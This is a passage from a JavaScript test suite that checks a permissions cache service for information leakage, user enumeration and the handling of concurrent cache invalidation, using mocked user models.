          { id: 'admin-user', company_id: 'company-456', role: 'ADMIN' },
          { id: 'regular-user', company_id: 'company-456', role: 'USER' },
        ];

        mockUserModel.findByPk.mockImplementation((id) => {
          return Promise.resolve(users.find((u) => u.id === id));
        });
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Cache permissions for both users
        for (const user of users) {
          await service.getEffectivePermissionsForUser(user.id, 'company-456');
        }

        const stats = await service.getCacheStatistics();

        // Cache statistics should not reveal information about user permissions
        expect(stats.total_entries).toBe(2);
        expect(stats).not.toHaveProperty('user_permissions_breakdown');
      });

      it('should prevent user enumeration via cache patterns', async () => {
        const existingUser = { id: 'existing-user', company_id: 'company-456' };

        mockUserModel.findByPk.mockImplementation((id) => {
          return id === 'existing-user' ? Promise.resolve(existingUser) : Promise.resolve(null);
        });

        // Try to cache permissions for non-existent users
        const nonExistentUsers = ['fake-user-1', 'fake-user-2', 'fake-user-3'];

        for (const userId of nonExistentUsers) {
          await expect(
            service.getEffectivePermissionsForUser(userId, 'company-456')
          ).rejects.toThrow(InternalServerErrorException);
        }

        // Cache should not contain entries for non-existent users
        const stats = await service.getCacheStatistics();
        expect(stats.total_entries).toBe(0);
      });
    });

    describe('Cache Invalidation Security', () => {
      it('should validate cache invalidation permissions', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Populate cache
        await service.getEffectivePermissionsForUser('user-123', 'company-456');

        // Invalidation should be controlled
        const result = await service.invalidateCache({
          user_id: 'user-123',
          reason: 'Security test',
        });

        expect(result.invalidated_count).toBeGreaterThan(0);
      });

      it('should prevent cache invalidation storms', async () => {
        const user = { id: 'user-123', company_id: 'company-456' };
        mockUserModel.findByPk.mockResolvedValue(user);
        mockUserRoleModel.findAll.mockResolvedValue([]);
        mockUserPermissionModel.findAll.mockResolvedValue([]);

        // Populate cache
        await service.getEffectivePermissionsForUser('user-123', 'company-456');

        // Multiple rapid invalidation requests
        const invalidationPromises = Array.from({ length: 10 }, () =>
          service.invalidateCache({
            user_id: 'user-123',
            reason: 'Storm test',
          })
        );

        const results = await Promise.all(invalidationPromises);

        // Should handle concurrent invalidations gracefully
        results.forEach((result) => {
          expect(result).toHaveProperty('invalidated_at');
        });
      });
    });
  });

  // To be continued in additional test files...
  // This file covers the first major sections of security testing.
  // Additional files will cover API Security, Legal Platform Security,
  // Advanced Edge Cases, and Compliance testing.
});
